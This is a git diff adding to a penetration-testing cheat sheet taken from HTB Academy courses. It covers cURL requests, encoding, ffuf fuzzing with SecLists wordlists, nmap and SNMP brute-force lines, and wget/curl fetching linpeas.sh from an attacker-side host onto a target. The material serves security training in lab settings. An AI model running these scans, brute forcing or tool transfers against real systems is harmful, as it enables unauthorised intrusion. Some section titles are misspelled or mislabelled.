@@ -92,6 +92,26 @@ We can now execute OS-level commands by adding a parameter to the GET request. i
 
 
 
+## Java Fundermentals (HTB Academy)
+curl http:/SERVER_IP:PORT/	cURL GET request
+curl -s http:/SERVER_IP:PORT/ -X POST	cURL POST request
+curl -s http:/SERVER_IP:PORT/ -X POST -d "param1=sample"	cURL POST request with data
+echo hackthebox | base64	base64 encode
+echo ENCODED_B64 | base64 -d	base64 decode
+echo hackthebox | xxd -p	hex encode
+echo ENCODED_HEX | xxd -p -r	hex decode
+echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'	rot13 encode
+echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'	rot13 decode
+Deobfuscation Websites
+Website
+Prettier
+Beautifier
+JSNice
+Misc
+Command	Description
+ctrl+u	Show HTML source code in Firefox
+
+
 
 
 
@@ -163,7 +183,7 @@ SSH to the server with the generated private key
 
 
 
-## Metasploit
+## Metasploit (HTB Academy)
 * install searchsploit
 > sudo apt install exploitdb -y
 
@@ -210,7 +230,7 @@ Start the Metasploit Framework
 
 
 
-### Nmap
+### Nmap (HTB Academy)
 netstat -rn
 nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
 nmap -sS -sC -sV -Pn -p- -T4 -A host ip
@@ -227,7 +247,7 @@ onesixtyone -c dict.txt 10.129.42.254	Brute force SNMP secret string
 
 
 
-## Windows Fundermentals
+## Windows Fundermentals (HTB Academy)
 > Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
 wmic os list brief - same as above
 
@@ -319,26 +339,62 @@ robots.txt
 
 * GET request with cURL
 > curl http://inlanefreight.com -v	- Verbose GET request with cURL
-  > curl http://admin:password@inlanefreight.com/ -vvv	- cURL Basic Auth login
-    > curl -u admin:password http://inlanefreight.com/ -vvv	Alternate cURL Basic Auth login
+
+> curl http://admin:password@inlanefreight.com/ -vvv	- cURL Basic Auth login
+
+> curl -u admin:password http://inlanefreight.com/ -vvv	Alternate cURL Basic Auth login
+
 curl -u admin:password -L http://inlanefreight.com/	cURL Basic Auth login, follow redirection
+
 curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'	cURL GET request with parameter
+
 curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php	POST request with cURL
+
 curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php -v	Debugging with cURL
+
 curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v	Cookie usage with cURL
+
 curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php	cURL with cookie file
+
 curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'	cURL specify content type
+
 curl -X OPTIONS http://inlanefreight.com/ -vv	cURL OPTIONS request
+
 curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv	File upload with cURL
+
 curl -X DELETE http://inlanefreight.com/test.txt -vv	DELETE method with cURL
 
+ffuf -h	ffuf help
+ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ	Directory Fuzzing
+ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ	Extension Fuzzing
+ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php	Page Fuzzing
+ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v	Recursive Fuzzing
+ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/	Sub-domain Fuzzing
+ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx	VHost Fuzzing
+ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx	Parameter Fuzzing - GET
+ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx	Parameter Fuzzing - POST
+ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx	Value Fuzzing
+Wordlists
+Command	Description
+/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt	Directory/Page Wordlist
+/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt	Extensions Wordlist
+/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt	Domain Wordlist
+/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt	Parameters Wordlist
+Misc
+Command	Description
+sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'	Add DNS entry
+for i in $(seq 1 1000); do echo $i >> ids.txt; done	Create Sequence Wordlist
+curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
 
 
 
 
 
 
-Transferring Files 	
+
+
+
+## Transferring Files 	
 python3 -m http.server 8000 	Start a local webserver
 wget http://10.10.14.1:8000/linpeas.sh 	Download a file on the remote server from our local machine
 curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 	Download a file on the remote server from our local machine
